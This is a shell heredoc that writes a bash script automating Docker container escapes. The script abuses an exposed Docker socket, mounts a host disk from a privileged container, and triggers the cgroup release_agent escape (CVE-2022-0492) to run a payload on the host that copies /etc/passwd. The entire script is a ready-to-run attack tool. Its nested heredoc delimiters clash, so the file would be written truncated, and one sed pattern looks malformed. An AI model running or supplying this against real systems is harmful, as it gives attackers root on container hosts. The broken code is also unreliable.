cat << 'EOF' > dockerexploit.sh
#!/bin/bash

# DockerEXPLOIT - Automated Docker Container Escape Exploitation
# Updated with Auto-Mount for CAP_SYS_ADMIN

# Color codes
RED='\033[0;31m'
LRED='\033[1;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
LGREEN='\033[1;32m'
BLUE='\033[0;34m'
LBLUE='\033[1;34m'
CYAN='\033[0;36m'
NC='\033[0m'

FINDINGS_FILE=""
EXPLOIT_TYPE=""
AUTO_MODE=false

print_header() {
    echo -e "\n${LBLUE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${LBLUE}[+] $1${NC}"
    echo -e "${LBLUE}═══════════════════════════════════════════════════════════${NC}"
}
print_success() { echo -e "${LGREEN}[✓] $1${NC}"; }
print_error() { echo -e "${LRED}[✗] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }
print_info() { echo -e "${CYAN}[*] $1${NC}"; }

parse_findings() {
    if [ ! -f "$FINDINGS_FILE" ]; then
        print_error "Findings file not found: $FINDINGS_FILE"
        exit 1
    fi
    print_info "Loading: $FINDINGS_FILE"
}

# --- EXPLOIT FUNCTIONS ---

exploit_docker_socket() {
    print_header "Exploiting Docker Socket"
    SOCK_PATH=$(grep -o '"/var/run/docker.sock\|/run/docker.sock"' "$FINDINGS_FILE" | tr -d '"' | head -1)
    [ -z "$SOCK_PATH" ] && SOCK_PATH="/var/run/docker.sock"
    
    if [ ! -S "$SOCK_PATH" ]; then
        print_error "Socket not accessible"
        return 1
    fi
    
    if command -v docker &> /dev/null; then
        print_success "Using Docker Client"
        docker -H unix://$SOCK_PATH run -v /:/hostfs --rm -it alpine sh -c "chroot /hostfs /bin/bash"
    else
        print_error "Docker client not found. (Curl exploit omitted for brevity in this fix)"
    fi
}

exploit_privileged_mount() {
    print_header "Exploiting Privileged Device Mount"
    DEVICE=$(ls /dev/sda* /dev/vda* /dev/xvda* 2>/dev/null | head -1)
    if [ -z "$DEVICE" ]; then
        print_error "No device found"
        return 1
    fi
    
    mkdir -p /mnt/hostfs
    if mount $DEVICE /mnt/hostfs 2>/dev/null; then
        print_success "Mounted host filesystem at /mnt/hostfs"
        chroot /mnt/hostfs /bin/bash
    else
        print_error "Mount failed"
    fi
}

exploit_cgroup_release_agent() {
    print_header "Exploiting cgroup release_agent (CVE-2022-0492)"
    
    # 1. Attempt to find existing cgroup
    CGROUP_PATH=$(grep -o '/sys/fs/cgroup/[^"]*' "$FINDINGS_FILE" | head -1)
    if [ -z "$CGROUP_PATH" ]; then
        # FIX: Auto-Mount Logic added here
        print_warning "No writable cgroup found mounted. Attempting to mount manually..."
        mkdir -p /tmp/cgrp
        
        # Try mounting different controllers
        if mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
           mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null || \
           mount -t cgroup -o pids cgroup /tmp/cgrp 2>/dev/null; then
            print_success "Successfully mounted cgroup controller at /tmp/cgrp"
            CGROUP_PATH="/tmp/cgrp"
        else
            print_error "Failed to mount cgroup controller. Exploit aborted."
            return 1
        fi
    fi
    
    # 2. Prepare Exploit
    RELEASE_AGENT="$CGROUP_PATH/release_agent"
    if [ ! -w "$RELEASE_AGENT" ]; then
        print_error "release_agent is not writable at $RELEASE_AGENT"
        return 1
    fi
    
    # 3. Create Payload
    PAYLOAD_PATH="/cmd"
    HOST_OUTPUT="/output"
    
    # We need the path of the container on the host
    # This sed command tries to find the 'upperdir' or 'perdir' from mtab
    HOST_PATH_GUESS=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
    if [ -z "$HOST_PATH_GUESS" ]; then
         HOST_PATH_GUESS=$(cat /proc/mounts | grep -o 'upperdir=[^,]*' | cut -d= -f2 | head -1)
    fi
    print_info "Guessed Host Path: $HOST_PATH_GUESS"

    # Create the script that the HOST will execute
    cat > $PAYLOAD_PATH << EOF
#!/bin/sh
echo "ESCAPED! Host Root Access Acquired" > $HOST_PATH_GUESS$HOST_OUTPUT
echo "---------------------------------" >> $HOST_PATH_GUESS$HOST_OUTPUT
cat /etc/passwd >> $HOST_PATH_GUESS$HOST_OUTPUT
EOF
    chmod +x $PAYLOAD_PATH
    
    # 4. Trigger
    echo 1 > $CGROUP_PATH/notify_on_release
    echo "$HOST_PATH_GUESS$PAYLOAD_PATH" > $RELEASE_AGENT
    
    # Spawn and kill a process in a child cgroup to trigger the notification
    mkdir -p $CGROUP_PATH/x
    sh -c "echo \$\$ > $CGROUP_PATH/x/cgroup.procs"
    
    sleep 2
    
    if [ -f "$HOST_OUTPUT" ]; then
        print_success "Exploit Successful! Reading loot:"
        cat $HOST_OUTPUT
    else
        print_error "Exploit triggered but no output file found."
        print_info "Host path guessing might have failed. Try manual exploitation."
    fi
}

# --- MAIN LOGIC ---

while getopts "r:e:a" opt; do
    case $opt in
        r) FINDINGS_FILE="$OPTARG" ;;
        e) EXPLOIT_TYPE="$OPTARG" ;;
        a) AUTO_MODE=true ;;
    esac
done

if [ -z "$FINDINGS_FILE" ]; then
    echo "Usage: ./dockerexploit.sh -r findings.json -a"
    exit 1
fi

parse_findings

if [ "$AUTO_MODE" = true ]; then
    if grep -q "CAP_SYS_ADMIN" "$FINDINGS_FILE"; then
        exploit_cgroup_release_agent
    elif grep -q "DOCKER_SOCKET" "$FINDINGS_FILE"; then
        exploit_docker_socket
    elif grep -q "PRIVILEGED_MODE" "$FINDINGS_FILE"; then
        exploit_privileged_mount
    else
        print_error "No auto-exploitable vulnerabilities found."
    fi
elif [ ! -z "$EXPLOIT_TYPE" ]; then
    case $EXPLOIT_TYPE in
        cgroup) exploit_cgroup_release_agent ;;
        socket) exploit_docker_socket ;;
        privileged) exploit_privileged_mount ;;
    esac
fi
EOF
